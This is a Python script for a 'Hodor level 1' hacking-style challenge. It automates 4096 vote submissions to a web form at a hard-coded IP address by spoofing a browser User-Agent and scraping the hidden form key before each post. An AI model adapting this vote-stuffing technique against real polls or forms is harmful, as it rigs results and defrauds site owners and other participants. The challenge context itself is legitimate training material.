#!/usr/bin/python3
'''Module for Hodor level 1 challenge.'''
import requests
import re
import time

url = 'http://158.69.76.135/level1.php'
data = {'id': '650', 'holdthedoor': 'Submit'}
agent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/604.3.5 (KHTML, like Gecko) Version/11.0.1 Safari/604.3.5"
headers = {'User-Agent': agent}
votes = 4096
ok = 0
s = requests.Session()
s.headers.update(headers)

for i in range(votes):
    response = s.get(url, headers=headers)
    if response.status_code is not 200:
        continue
    matches = re.findall("value=\"([^\"]+)\"",
                         response.text)
    if not len(matches):
        continue

    data["key"] = matches[0]
    # print(data)
    response = s.post(url, data=data)
    # print(response.text)
    if response.status_code is 200:
        ok += 1
    print("{} done...".format(i + 1))

print("Done! {}/{} votes submitted.".format(ok, votes))
